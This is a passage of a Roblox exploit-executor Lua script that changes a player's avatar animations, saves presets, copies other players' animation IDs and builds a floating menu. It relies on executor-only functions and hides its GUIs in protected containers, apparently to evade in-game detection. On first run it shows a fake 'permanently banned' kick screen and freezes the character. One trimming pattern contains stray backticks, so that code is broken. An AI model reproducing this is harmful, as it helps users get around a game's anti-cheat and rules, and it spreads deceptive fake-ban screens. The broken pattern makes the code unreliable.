--[[
COMBINED SCRIPT: Animation Bundle + Mautiku Notify + Fake Ban Prank + Help GUI
Updated: Custom Animation ID Input + Save/Load Preset System + Player ID Extractor + Server Player List + Mobile Floating Toggle
Style: Fantasy / Arcade Vibrant Neon Theme + Satisfying Multi-Pulse Haptics & Sound FX + Modern Drop Shadows
]]

-- ส่วนการ Reset ค่า Notify เพียงครั้งเดียว
local ResetFlag = "Mautiku_Message_Config_v6.json"
if isfile and not isfile(ResetFlag) then
if isfile("Mautiku_Message_Config.json") then
delfile("Mautiku_Message_Config.json")
end
if isfile("Mautiku_Message_Config_v5.json") then
delfile("Mautiku_Message_Config_v5.json")
end
writefile(ResetFlag, "Reset Done")
end

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local HapticService = game:GetService("HapticService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- ==============================================================================
-- SATISFYING MULTI-PULSE HAPTIC FEEDBACK & SOUND FX SYSTEM
-- ==============================================================================
local function TriggerSatisfyingHaptic(intensity, duration)
intensity = intensity or 0.8
duration = duration or 0.05

pcall(function()
HapticService:SetMotor(Enum.UserInputType.Gamepad1, Enum.VibrationMotor.Large, intensity)
task.delay(duration, function()
HapticService:SetMotor(Enum.UserInputType.Gamepad1, Enum.VibrationMotor.Large, 0)
end)
end)

pcall(function()
local GuiService = game:GetService("GuiService")
if GuiService.TriggerHapticFeedback then
GuiService:TriggerHapticFeedback(Enum.HapticType.Impact, intensity)
-- Multi-pulse burst for ultimate satisfied tactile feel
if intensity >= 0.8 then
task.delay(0.03, function()
pcall(function()
GuiService:TriggerHapticFeedback(Enum.HapticType.Selection, intensity * 0.7)
end)
end)
end
end
end)
end

local function PlayUISound(soundType)
pcall(function()
local sound = Instance.new("Sound")
sound.Parent = CoreGui
sound.Volume = 0.8
if soundType == "click" then
sound.SoundId = "rbxassetid://6895079853"
elseif soundType == "open" then
sound.SoundId = "rbxassetid://9125402735"
elseif soundType == "close" then
sound.SoundId = "rbxassetid://6895079853"
elseif soundType == "success" then
sound.SoundId = "rbxassetid://6026982008"
else
sound.SoundId = "rbxassetid://6895079853"
end
sound:Play()
task.delay(2, function() sound:Destroy() end)
end)
end

-- ==============================================================================
-- 1. FAKE BAN PRANK SYSTEM
-- ==============================================================================
task.spawn(function()
local FLAG_FILE_NAME = "fake_ban_prank_shown.txt"
local has_been_shown = false

if pcall(function() return readfile(FLAG_FILE_NAME) end) then
local flag_content = readfile(FLAG_FILE_NAME)
if flag_content and flag_content:find("shown") then
has_been_shown = true
end
end

if has_been_shown then
return
end

local FakeBanGui = Instance.new("ScreenGui")
FakeBanGui.Name = "CriticalErrorUI"
FakeBanGui.IgnoreGuiInset = true
FakeBanGui.DisplayOrder = 10000
FakeBanGui.ResetOnSpawn = false

if gethui then
FakeBanGui.Parent = gethui()
elseif syn and syn.protect_gui then
syn.protect_gui(FakeBanGui)
FakeBanGui.Parent = CoreGui
else
FakeBanGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

local Backdrop = Instance.new("Frame")
Backdrop.Name = "Backdrop"
Backdrop.Parent = FakeBanGui
Backdrop.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Backdrop.BackgroundTransparency = 0
Backdrop.Size = UDim2.new(1, 0, 1, 0)
Backdrop.Position = UDim2.new(0, 0, 0, 0)
Backdrop.BorderSizePixel = 0
Backdrop.ZIndex = 1

local Container = Instance.new("Frame")
Container.Parent = Backdrop
Container.BackgroundTransparency = 1
Container.Size = UDim2.new(0.8, 0, 0.6, 0)
Container.Position = UDim2.new(0.5, 0, 0.5, 0)
Container.AnchorPoint = Vector2.new(0.5, 0.5)
Container.ZIndex = 2

local Header = Instance.new("TextLabel")
Header.Parent = Container
Header.BackgroundTransparency = 1
Header.Size = UDim2.new(1, 0, 0.15, 0)
Header.Position = UDim2.new(0, 0, 0, 0)
Header.Font = Enum.Font.GothamBold
Header.Text = "Disconnected"
Header.TextColor3 = Color3.fromRGB(255, 255, 255)
Header.TextSize = 24
Header.TextYAlignment = Enum.TextYAlignment.Bottom

local Message = Instance.new("TextLabel")
Message.Parent = Container
Message.BackgroundTransparency = 1
Message.Size = UDim2.new(1, 0, 0.5, 0)
Message.Position = UDim2.new(0, 0, 0.2, 0)
Message.Font = Enum.Font.Gotham
Message.Text = "You have been kicked from this experience: \n\nYou are permanently banned from this game due to exploiting.\n(Error Code: 267)"
Message.TextColor3 = Color3.fromRGB(190, 190, 190)
Message.TextSize = 18
Message.TextWrapped = true

local Button = Instance.new("Frame")
Button.Parent = Container
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.Size = UDim2.new(0.4, 0, 0.12, 0)
Button.Position = UDim2.new(0.5, 0, 0.85, 0)
Button.AnchorPoint = Vector2.new(0.5, 0.5)

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 8)
BtnCorner.Parent = Button

local BtnText = Instance.new("TextLabel")
BtnText.Parent = Button
BtnText.BackgroundTransparency = 1
BtnText.Size = UDim2.new(1, 0, 1, 0)
BtnText.Font = Enum.Font.GothamBold
BtnText.Text = "Leave"
BtnText.TextColor3 = Color3.fromRGB(30, 30, 30)
BtnText.TextSize = 18

local Sound = Instance.new("Sound")
Sound.Parent = FakeBanGui
Sound.SoundId = "rbxasset://sounds/uuhhh.mp3"
Sound.Volume = 2
Sound:Play()

if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
LocalPlayer.Character.HumanoidRootPart.Anchored = true
end

task.wait(5)

Header.Text = "JUST KIDDING!"
Header.TextColor3 = Color3.fromRGB(255, 215, 0)
Message.Text = "This is just trolling \n\ngetting back to the game..."
BtnText.Text = "This won't show again"

if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
LocalPlayer.Character.HumanoidRootPart.Anchored = false
end

task.wait(3)
FakeBanGui:Destroy()

if writefile then
pcall(function()
writefile(FLAG_FILE_NAME, "shown")
end)
end
end)

-- ==============================================================================
-- 2. R6 PROTECTION CHECK
-- ==============================================================================
local function isR15()
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid", 10)
if humanoid then
return humanoid.RigType == Enum.HumanoidRigType.R15
end
return false
end

if not isR15() then
warn("Script Stopped: This script supports R15 avatars only. (R6 Detected)")
return
end

-- ==============================================================================
-- 3. ANIMATION SYSTEM
-- ==============================================================================
do
print("Initializing Animation System...")

if getgenv().EnableHybridCustom == nil then
getgenv().EnableHybridCustom = false
end

if getgenv().HybridSettings == nil then
getgenv().HybridSettings = {
idle1 = "Ud", idle2 = "Ud", walk = "Ninja",
run = "Ud", jump = "Levitate", fall = "Hero",
climb = "Default", swim = "Default", swimidle = "Default"
}
end

if getgenv().ChosenBundleName == nil then
getgenv().ChosenBundleName = "Cute"
end

local MasterBundles = {
Ninja = {
idle1 = "rbxassetid://656117400", idle2 = "rbxassetid://656118341", walk = "rbxassetid://656121766",
run = "rbxassetid://656118852", jump = "rbxassetid://656117878", fall = "rbxassetid://10921159222",
climb = "rbxassetid://656114359", swim = "rbxassetid://10921161002", swimidle = "rbxassetid://10922757002"
},
Robot = {
idle1 = "rbxassetid://616088211", idle2 = "rbxassetid://616089559", walk = "rbxassetid://616095330",
run = "rbxassetid://616091570", jump = "rbxassetid://616090535", fall = "rbxassetid://616092998",
climb = "rbxassetid://616086039", swim = "rbxassetid://10921253142", swimidle = "rbxassetid://10921253767"
},
Default = {
idle1 = "rbxassetid://507766388", idle2 = "rbxassetid://507766666", walk = "rbxassetid://10921269718",
run = "rbxassetid://10921261968", jump = "rbxassetid://10921263860", fall = "rbxassetid://10921262864",
climb = "rbxassetid://10921257536", swim = "rbxassetid://10921264784", swimidle = "rbxassetid://10921265698"
},
custom = {
idle1 = "rbxassetid://92080889861410", idle2 = "rbxassetid://74451233229259", walk = "rbxassetid://16738340646",
run = "rbxassetid://16738337225", jump = "rbxassetid://104325245285198", fall = "rbxassetid://616003713",
climb = "rbxassetid://18537363391", swim = "rbxassetid://133308483266208", swimidle = "rbxassetid://109346520324160"
},
Levitate = {
idle1 = "rbxassetid://616006778", idle2 = "rbxassetid://616008087", walk = "rbxassetid://616013216",
run = "rbxassetid://616010382", jump = "rbxassetid://616008936", fall = "rbxassetid://616005863",
climb = "rbxassetid://616003713", swim = "rbxassetid://10921139478", swimidle = "rbxassetid://10921138209"
},
Mage = {
idle1 = "rbxassetid://707742142", idle2 = "rbxassetid://707855907", walk = "rbxassetid://707897309",
run = "rbxassetid://707861613", jump = "rbxassetid://707853694", fall = "rbxassetid://707829716",
climb = "rbxassetid://707826056", swim = "rbxassetid://10921150788", swimidle = "rbxassetid://10921151661"
},
Stylish = {
idle1 = "rbxassetid://616136790", idle2 = "rbxassetid://616138447", walk = "rbxassetid://616146177",
run = "rbxassetid://616140816", jump = "rbxassetid://616139451", fall = "rbxassetid://616134815",
climb = "rbxassetid://616133594", swim = "rbxassetid://10921281000", swimidle = "rbxassetid://10921281964"
},
Hero = {
idle1 = "rbxassetid://616111295", idle2 = "rbxassetid://616113536", walk = "rbxassetid://616122287",
run = "rbxassetid://616117076", jump = "rbxassetid://616115533", fall = "rbxassetid://616108001",
climb = "rbxassetid://616104706", swim = "rbxassetid://10921295495", swimidle = "rbxassetid://10921297391"
},
Toy = {
idle1 = "rbxassetid://782841498", idle2 = "rbxassetid://782845736", walk = "rbxassetid://782843345",
run = "rbxassetid://782842708", jump = "rbxassetid://782847020", fall = "rbxassetid://782846423",
climb = "rbxassetid://782843869", swim = "rbxassetid://10921309319", swimidle = "rbxassetid://10921310341"
},
Astronaut = {
idle1 = "rbxassetid://891621366", idle2 = "rbxassetid://891633237", walk = "rbxassetid://891667138",
run = "rbxassetid://891636393", jump = "rbxassetid://891627522", fall = "rbxassetid://891617961",
climb = "rbxassetid://891609353", swim = "rbxassetid://10921044000", swimidle = "rbxassetid://10921045006"
},
Bubbly = {
idle1 = "rbxassetid://910004836", idle2 = "rbxassetid://910009958", walk = "rbxassetid://910034870",
run = "rbxassetid://910025107", jump = "rbxassetid://910016857", fall = "rbxassetid://910001910",
climb = "rbxassetid://742636889", swim = "rbxassetid://10921063569", swimidle = "rbxassetid://10922582160"
},
Cartoony = {
idle1 = "rbxassetid://742637544", idle2 = "rbxassetid://742638445", walk = "rbxassetid://742640026",
run = "rbxassetid://742638842", jump = "rbxassetid://742637942", fall = "rbxassetid://742637151",
climb = "rbxassetid://742636889", swim = "rbxassetid://10921079380", swimidle = "rbxassetid://10921081059"
},
Elder = {
idle1 = "rbxassetid://845397899", idle2 = "rbxassetid://845400520", walk = "rbxassetid://845403856",
run = "rbxassetid://845386501", jump = "rbxassetid://845398858", fall = "rbxassetid://845396048",
climb = "rbxassetid://845392038", swim = "rbxassetid://10921108971", swimidle = "rbxassetid://10921110146"
},
Ghost = {
idle1 = "rbxassetid://616006778", idle2 = "rbxassetid://616008087", walk = "rbxassetid://616013216",
run = "rbxassetid://616013216", jump = "rbxassetid://616008936", fall = "rbxassetid://616005863",
climb = "rbxassetid://616156119", swim = "rbxassetid://133308483266208", swimidle = "rbxassetid://109346520324160"
},
Knight = {
idle1 = "rbxassetid://657595757", idle2 = "rbxassetid://657568135", walk = "rbxassetid://657552124",
run = "rbxassetid://657564596", jump = "rbxassetid://658409194", fall = "rbxassetid://657600338",
climb = "rbxassetid://658360781", swim = "rbxassetid://10921125160", swimidle = "rbxassetid://10921125935"
},
Vampire = {
idle1 = "rbxassetid://1083445855", idle2 = "rbxassetid://1083450166", walk = "rbxassetid://1083473930",
run = "rbxassetid://1083462077", jump = "rbxassetid://1083455352", fall = "rbxassetid://1083443587",
climb = "rbxassetid://1083439238", swim = "rbxassetid://10921324408", swimidle = "rbxassetid://10921325443"
},
Werewolf = {
idle1 = "rbxassetid://1083195517", idle2 = "rbxassetid://1083214717", walk = "rbxassetid://1083178339",
run = "rbxassetid://1083216690", jump = "rbxassetid://1083218792", fall = "rbxassetid://1083189019",
climb = "rbxassetid://1083182000", swim = "rbxassetid://10921340419", swimidle = "rbxassetid://10921341319"
},
Zombie = {
idle1 = "rbxassetid://616158929", idle2 = "rbxassetid://616160636", walk = "rbxassetid://616168032",
run = "rbxassetid://616163682", jump = "rbxassetid://616161997", fall = "rbxassetid://616157476",
climb = "rbxassetid://616156119", swim = "rbxassetid://10921352344", swimidle = "rbxassetid://10921353442"
},
Bold = {
idle1 = "rbxassetid://16738333868", idle2 = "rbxassetid://16738334710", walk = "rbxassetid://16738340646",
run = "rbxassetid://16738337225", jump = "rbxassetid://16738336650", fall = "rbxassetid://16738333171",
climb = "rbxassetid://16738332169", swim = "rbxassetid://16738339158", swimidle = "rbxassetid://16738339817"
},
Adidas = {
idle1 = "rbxassetid://18537376492", idle2 = "rbxassetid://18537371272", walk = "rbxassetid://18537392113",
run = "rbxassetid://18537384940", jump = "rbxassetid://18537380791", fall = "rbxassetid://18537367238",
climb = "rbxassetid://18537363391", swim = "rbxassetid://18537389531", swimidle = "rbxassetid://18537387180"
},
Borock = {
idle1 = "rbxassetid://3293641938", idle2 = "rbxassetid://3293642554", walk = "rbxassetid://10921269718",
run = "rbxassetid://3236836670", jump = "rbxassetid://10921263860", fall = "rbxassetid://10921262864",
climb = "rbxassetid://10921257536", swim = "rbxassetid://10921264784", swimidle = "rbxassetid://10921265698"
},
Catwalk = {
idle1 = "rbxassetid://133806214992291", idle2 = "rbxassetid://94970088341563", walk = "rbxassetid://109168724482748",
run = "rbxassetid://81024476153754", jump = "rbxassetid://116936326516985", fall = "rbxassetid://119377220967554",
climb = "rbxassetid://92294537340807", swim = "rbxassetid://134591743181628", swimidle = "rbxassetid://98854111361360"
},
Walmart = {
idle1 = "rbxassetid://18747067405", idle2 = "rbxassetid://18747063918", walk = "rbxassetid://18747074203",
run = "rbxassetid://18747070484", jump = "rbxassetid://18747069148", fall = "rbxassetid://18747062535",
climb = "rbxassetid://18747060903", swim = "rbxassetid://18747073181", swimidle = "rbxassetid://18747071682"
},
Wicked = {
idle1 = "rbxassetid://118832222982049", idle2 = "rbxassetid://76049494037641", walk = "rbxassetid://92072849924640",
run = "rbxassetid://72301599441680", jump = "rbxassetid://104325245285198", fall = "rbxassetid://121152442762481",
climb = "rbxassetid://131326830509784", swim = "rbxassetid://99384245425157", swimidle = "rbxassetid://113199415118199"
},
NFL = {
idle1 = "rbxassetid://92080889861410", idle2 = "rbxassetid://74451233229259", walk = "rbxassetid://110358958299415",
run = "rbxassetid://117333533048078", jump = "rbxassetid://119846112151352", fall = "rbxassetid://129773241321032",
climb = "rbxassetid://134630013742019", swim = "rbxassetid://132697394189921", swimidle = "rbxassetid://79090109939093"
},
Pirate = {
idle1 = "rbxassetid://750781874", idle2 = "rbxassetid://750782770", walk = "rbxassetid://750785693",
run = "rbxassetid://750783738", jump = "rbxassetid://750782230", fall = "rbxassetid://750780242",
climb = "rbxassetid://750779899", swim = "rbxassetid://750784579", swimidle = "rbxassetid://750785176"
},
Adidas2 = {
idle1 = "rbxassetid://122257458498464", idle2 = "rbxassetid://102357151005774", walk = "rbxassetid://122150855457006",
run = "rbxassetid://82598234841035", jump = "rbxassetid://75290611992385", fall = "rbxassetid://98600215928904",
climb = "rbxassetid://88763136693023", swim = "rbxassetid://133308483266208", swimidle = "rbxassetid://109346520324160"
},
Animals = {
idle1 = "rbxassetid://101538802180310", idle2 = "rbxassetid://102357151005774", walk = "rbxassetid://122150855457006",
run = "rbxassetid://87721497492370", jump = "rbxassetid://75290611992385", fall = "rbxassetid://98600215928904",
climb = "rbxassetid://88763136693023", swim = "rbxassetid://133308483266208", swimidle = "rbxassetid://109346520324160"
},
Aura = {
idle1 = "rbxassetid://110211186840347", idle2 = "rbxassetid://114191137265065", walk = "rbxassetid://83842218823011",
run = "rbxassetid://118320322718866", jump = "rbxassetid://109996626521204", fall = "rbxassetid://95603166884636",
climb = "rbxassetid://97824616490448", swim = "rbxassetid://134530128383903", swimidle = "rbxassetid://94922130551805"
},
Wicked2 = {
idle1 = "rbxassetid://92849173543269", idle2 = "rbxassetid://132238900951109", walk = "rbxassetid://73718308412641",
run = "rbxassetid://135515454877967", jump = "rbxassetid://78508480717326", fall = "rbxassetid://78147885297412",
climb = "rbxassetid://129447497744818", swim = "rbxassetid://110657013921774", swimidle = "rbxassetid://129183123083281"
},
Unboxed = {
idle1 = "rbxassetid://98281136301627", idle2 = "rbxassetid://138183121662404", walk = "rbxassetid://90478085024465",
run = "rbxassetid://134824450619865", jump = "rbxassetid://121454505477205", fall = "rbxassetid://94788218468396",
climb = "rbxassetid://121145883950231", swim = "rbxassetid://105962919001086", swimidle = "rbxassetid://129126268464847"
},
Ud = {
idle1 = "rbxassetid://3303162274", idle2 = "rbxassetid://3303162549", walk = "rbxassetid://3303162967",
run = "rbxassetid://3236836670", jump = "rbxassetid://10921263860", fall = "rbxassetid://10921262864",
climb = "rbxassetid://10921257536", swim = "rbxassetid://10921264784", swimidle = "rbxassetid://10921265698"
},
Toilet = {
idle1 = "rbxassetid://4417977954", idle2 = "rbxassetid://4417978624", walk = "rbxassetid://10921269718",
run = "rbxassetid://4417979645", jump = "rbxassetid://10921263860", fall = "rbxassetid://10921262864",
climb = "rbxassetid://10921257536", swim = "rbxassetid://10921264784", swimidle = "rbxassetid://10921265698"
},
Gm = {
idle1 = "rbxassetid://137764781910579", idle2 = "rbxassetid://96439737641086", walk = "rbxassetid://85809016093530",
run = "rbxassetid://101925097435036", jump = "rbxassetid://74159004634379", fall = "rbxassetid://98070939608691",
climb = "rbxassetid://108236155509584", swim = "rbxassetid://83003487432457", swimidle = "rbxassetid://112946194103503"
},
Kat = {
idle1 = "rbxassetid://108187809145790", idle2 = "rbxassetid://72329200359275", walk = "rbxassetid://99182913548783",
run = "rbxassetid://73117360545482", jump = "rbxassetid://103632305262747", fall = "rbxassetid://127802717128367",
climb = "rbxassetid://106213237973858", swim = "rbxassetid://134148268480210", swimidle = "rbxassetid://138619485942849"
},
Oldschool = {
idle1 = "rbxassetid://10921230744", idle2 = "rbxassetid://10921232093", walk = "rbxassetid://10921244891",
run = "rbxassetid://10921240218", jump = "rbxassetid://10921242013", fall = "rbxassetid://10921241244",
climb = "rbxassetid://10921229866", swim = "rbxassetid://10921243048", swimidle = "rbxassetid://10921244018"
}
}

-- ==============================================================================
-- CUSTOM ANIMATION SYSTEM & PRESETS
-- ==============================================================================
local PRESETS_FILE = "Mautiku_CustomPresets_v1.json"
local ANIM_KEYS = {"idle1", "idle2", "walk", "run", "jump", "fall", "climb", "swim", "swimidle"}

local function LoadPresets()
if isfile and isfile(PRESETS_FILE) then
local success, result = pcall(function()
return HttpService:JSONDecode(readfile(PRESETS_FILE))
end)
if success and type(result) == "table" then
return result
end
end
return {}
end

local function SavePresets(presets)
if writefile then
pcall(function()
writefile(PRESETS_FILE, HttpService:JSONEncode(presets))
end)
end
end

local UserPresets = LoadPresets()

for presetName, animData in pairs(UserPresets) do
MasterBundles[presetName] = animData
end

if getgenv().CurrentCustomIDs == nil then
getgenv().CurrentCustomIDs = {
idle1 = "", idle2 = "", walk = "", run = "", jump = "",
fall = "", climb = "", swim = "", swimidle = ""
}
end

local IsActive = true
local CurrentBundleName = getgenv().ChosenBundleName

local function StopAllAnimations(Humanoid)
if not Humanoid or Humanoid.Parent == nil then return end
for _, track in pairs(Humanoid:GetPlayingAnimationTracks()) do
track:Stop()
track:Destroy()
end
end

local function GetAnimID(AnimKey)
local targetVal
if getgenv().EnableHybridCustom then
targetVal = getgenv().HybridSettings[AnimKey]
if not targetVal then
warn("Hybrid Error: Setting missing for '"..AnimKey.."'. Falling back to Default.")
targetVal = "Default"
end
else
targetVal = getgenv().ChosenBundleName
if not targetVal then
warn("Bundle Error: Bundle missing. Falling back to Default.")
targetVal = "Default"
end
end

if MasterBundles[targetVal] then
local id = MasterBundles[targetVal][AnimKey]
if id then return id end
end

if type(targetVal) == "string" and (targetVal:find("rbxassetid://") or targetVal:match("^%d+")) then
return "rbxassetid://" .. targetVal:gsub("%D", "")
end

return MasterBundles["Default"][AnimKey]
end

local function UpdateAnims(Character)
if not IsActive then return end
local Humanoid = Character:WaitForChild("Humanoid", 10)
local AnimateScript = Character:WaitForChild("Animate", 10)

if not Humanoid or not AnimateScript then warn("Humanoid or Animate script not found.") return end

local walkController = AnimateScript:WaitForChild("walk", 5)
if not walkController then warn("Animate script failed to initialize.") return end

task.wait(0.01)
CurrentBundleName = getgenv().ChosenBundleName
StopAllAnimations(Humanoid)

local function changeID(parentName, newID)
local parentValue = AnimateScript:FindFirstChild(parentName)
if parentValue then
for _, child in pairs(parentValue:GetChildren()) do
if child:IsA("Animation") then child.AnimationId = newID end
end
end
end

changeID("walk", GetAnimID("walk"))
changeID("run", GetAnimID("run"))
changeID("jump", GetAnimID("jump"))
changeID("fall", GetAnimID("fall"))
changeID("climb", GetAnimID("climb"))
changeID("swim", GetAnimID("swim"))
changeID("swimidle", GetAnimID("swimidle"))

local idleValue = AnimateScript:FindFirstChild("idle")
if idleValue then
local idleMapping = {GetAnimID("idle1"), GetAnimID("idle2")}
for i, animId in ipairs(idleMapping) do
local animObject = idleValue:FindFirstChild("Animation"..i)
if animObject and animObject:IsA("Animation") then
animObject.AnimationId = animId
end
end
end

AnimateScript.Disabled = true
task.wait()
AnimateScript.Disabled = false

if getgenv().EnableHybridCustom then
print("Animations set to: HYBRID CUSTOM MODE")
else
print("Animations set to: "..CurrentBundleName.." (SINGLE MODE)")
end
end

getgenv().ToggleHybridMode = function(enabled)
local state = enabled == true
IsActive = true
if getgenv().EnableHybridCustom ~= state then
getgenv().EnableHybridCustom = state
print("Hybrid Custom Mode is now: "..(state and "ENABLED" or "DISABLED"))
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
else
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
print("Hybrid Custom Mode is already: "..(state and "ENABLED" or "DISABLED"))
end
end

getgenv().SwitchAnimationBundle = function(bundleName)
local lowerName = bundleName:lower()
local foundKey = nil
for k, _ in pairs(MasterBundles) do
if k:lower() == lowerName then
foundKey = k
break
end
end
if foundKey then
IsActive = true
if getgenv().EnableHybridCustom then getgenv().ToggleHybridMode(false) end
if foundKey ~= getgenv().ChosenBundleName then
print("Switching bundle to: "..foundKey)
getgenv().ChosenBundleName = foundKey
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
else
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
print("Already using bundle: "..foundKey.." - Reapplied animations.")
end
else
warn("Error: Bundle '"..bundleName.."' not found.")
end
end

local function NormalizeID(input)
if not input or input == "" then return nil end
input = tostring(input):gsub("%s+", "")
if input == "" then return nil end

if input:match("^rbxassetid://") then
return input
end

local numMatch = input:match("(%d+)")
if numMatch and #numMatch >= 5 then
return "rbxassetid://" .. numMatch
end

return nil
end

getgenv().ApplyCustomIDs = function(idsTable)
if not MasterBundles["_TempCustom"] then
MasterBundles["_TempCustom"] = {}
end

for _, key in ipairs(ANIM_KEYS) do
local id = NormalizeID(idsTable[key])
if id then
MasterBundles["_TempCustom"][key] = id
else
MasterBundles["_TempCustom"][key] = MasterBundles["Default"][key]
end
end

IsActive = true
if getgenv().EnableHybridCustom then
getgenv().EnableHybridCustom = false
end
getgenv().ChosenBundleName = "_TempCustom"
if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
print("Applied custom animation IDs (unsaved).")
end

getgenv().SaveCustomPreset = function(presetName, idsTable)
if not presetName or presetName:gsub("%s+", "") == "" then
return false, "Preset name empty"
end
presetName = presetName:gsub("^%s+", ""):gsub("%s+$```", "")

local data = {}
for _, key in ipairs(ANIM_KEYS) do
local id = NormalizeID(idsTable[key])
if id then
data[key] = id
else
data[key] = MasterBundles["Default"][key]
end
end

UserPresets[presetName] = data
MasterBundles[presetName] = data
SavePresets(UserPresets)
print("Saved preset: " .. presetName .. " (Can now be used in getgenv().HybridSettings!)")
return true, "Saved!"
end

getgenv().DeleteCustomPreset = function(presetName)
if UserPresets[presetName] then
UserPresets[presetName] = nil
MasterBundles[presetName] = nil
SavePresets(UserPresets)
print("Deleted preset: " .. presetName)
return true
end
return false
end

getgenv().GetCustomPresets = function()
return UserPresets
end

local function ExtractPlayerAnims(targetPlayer)
local result = {}
if not targetPlayer or not targetPlayer.Character then return result end
local char = targetPlayer.Character
local animScript = char:FindFirstChild("Animate")

if animScript then
local function checkVal(folderName)
local folder = animScript:FindFirstChild(folderName)
if folder then
for _, child in pairs(folder:GetChildren()) do
if child:IsA("Animation") and child.AnimationId ~= "" then
return child.AnimationId
end
end
end
return nil
end

result.walk = checkVal("walk")
result.run = checkVal("run")
result.jump = checkVal("jump")
result.fall = checkVal("fall")
result.climb = checkVal("climb")
result.swim = checkVal("swim")
result.swimidle = checkVal("swimidle")

local idleFolder = animScript:FindFirstChild("idle")
if idleFolder then
local a1 = idleFolder:FindFirstChild("Animation1")
local a2 = idleFolder:FindFirstChild("Animation2")
if a1 and a1:IsA("Animation") then result.idle1 = a1.AnimationId end
if a2 and a2:IsA("Animation") then result.idle2 = a2.AnimationId end
end
end

local humanoid = char:FindFirstChildOfClass("Humanoid")
if humanoid then
for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
if track.Animation and track.Animation.AnimationId ~= "" then
local name = track.Name:lower()
if name:find("walk") and not result.walk then result.walk = track.Animation.AnimationId
elseif name:find("run") and not result.run then result.run = track.Animation.AnimationId
elseif name:find("jump") and not result.jump then result.jump = track.Animation.AnimationId
elseif name:find("fall") and not result.fall then result.fall = track.Animation.AnimationId
elseif name:find("idle") and not result.idle1 then result.idle1 = track.Animation.AnimationId
end
end
end
end

return result
end

if LocalPlayer.Character then UpdateAnims(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(UpdateAnims)

-- ==============================================================================
-- HELP GUI + MOBILE FLOATING ICON & ALL PLAYERS SELECTOR
-- ==============================================================================
local HelpGui = nil
local FloatGui = nil
local MobileToggleBtn = nil
local KatRainbowConnection = nil
local BorderRainbowConnection = nil

-- Function to safely add an external drop shadow
local function AddDropShadow(targetFrame, radius, transparency)
local shadow = Instance.new("ImageLabel")
shadow.Name = "DropShadow"
shadow.Parent = targetFrame
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://6015897843"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = transparency or 0.5
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(49, 49, 450, 450)
shadow.Size = UDim2.new(1, radius * 2, 1, radius * 2)
shadow.Position = UDim2.new(0, -radius, 0, -radius)
shadow.ZIndex = targetFrame.ZIndex - 1
return shadow
end

-- MODIFIED: HideMobileFloatingIcon (Only called when X is pressed)
local function HideMobileFloatingIcon()
local existingFloatGui = nil
if gethui then existingFloatGui = gethui():FindFirstChild("MautikuMobileToggle") end
if not existingFloatGui and CoreGui then existingFloatGui = CoreGui:FindFirstChild("MautikuMobileToggle") end

if existingFloatGui then
existingFloatGui:Destroy()
end
FloatGui = nil
MobileToggleBtn = nil
end

-- MODIFIED: CreateMobileFloatingIcon (Toggle logic fixed)
local function CreateMobileFloatingIcon()
local existingFloatGui = nil
if gethui then existingFloatGui = gethui():FindFirstChild("MautikuMobileToggle") end
if not existingFloatGui and CoreGui then existingFloatGui = CoreGui:FindFirstChild("MautikuMobileToggle") end

if existingFloatGui then
FloatGui = existingFloatGui
MobileToggleBtn = FloatGui:FindFirstChild("MobileToggleIcon")
if FloatGui and MobileToggleBtn then FloatGui.Enabled = true end
return
end

FloatGui = Instance.new("ScreenGui")
FloatGui.Name = "MautikuMobileToggle"
FloatGui.ResetOnSpawn = false
FloatGui.DisplayOrder = 9999

if gethui then FloatGui.Parent = gethui()
elseif syn and syn.protect_gui then syn.protect_gui(FloatGui) FloatGui.Parent = CoreGui
else FloatGui.Parent = CoreGui end

local FloatBtn = Instance.new("TextButton")
FloatBtn.Name = "MobileToggleIcon"
FloatBtn.Parent = FloatGui
FloatBtn.Size = UDim2.new(0, 46, 0, 46)
FloatBtn.Position = UDim2.new(0, 15, 0.5, -23)
FloatBtn.BackgroundColor3 = Color3.fromRGB(130, 70, 240)
FloatBtn.Text = "🥺"
FloatBtn.TextSize = 24
FloatBtn.AutoButtonColor = false
FloatBtn.Active = true
FloatBtn.Draggable = true
FloatBtn.ZIndex = 100

local FCorner = Instance.new("UICorner")
FCorner.CornerRadius = UDim.new(0, 23)
FCorner.Parent = FloatBtn

local FGradient = Instance.new("UIGradient")
FGradient.Parent = FloatBtn
FGradient.Color = ColorSequence.new({
ColorSequenceKeypoint.new(0, Color3.fromRGB(190, 100, 255)),
ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 50, 220)),
ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 20, 150))
})
FGradient.Rotation = 45

local FStroke = Instance.new("UIStroke")
FStroke.Parent = FloatBtn
FStroke.Color = Color3.fromRGB(255, 215, 100)
FStroke.Thickness = 2.5

-- Add Shadow to Floating Icon
AddDropShadow(FloatBtn, 12, 0.4)

MobileToggleBtn = FloatBtn

-- FIX: Toggle logic now only hides/shows Main GUI smoothly, does NOT destroy icon
FloatBtn.MouseButton1Click:Connect(function()
PlayUISound("pop")
TriggerSatisfyingHaptic(0.8, 0.05)

local currentHelpGui = nil
if gethui then currentHelpGui = gethui():FindFirstChild("AnimationHelpGui") end
if not currentHelpGui and CoreGui then currentHelpGui = CoreGui:FindFirstChild("AnimationHelpGui") end
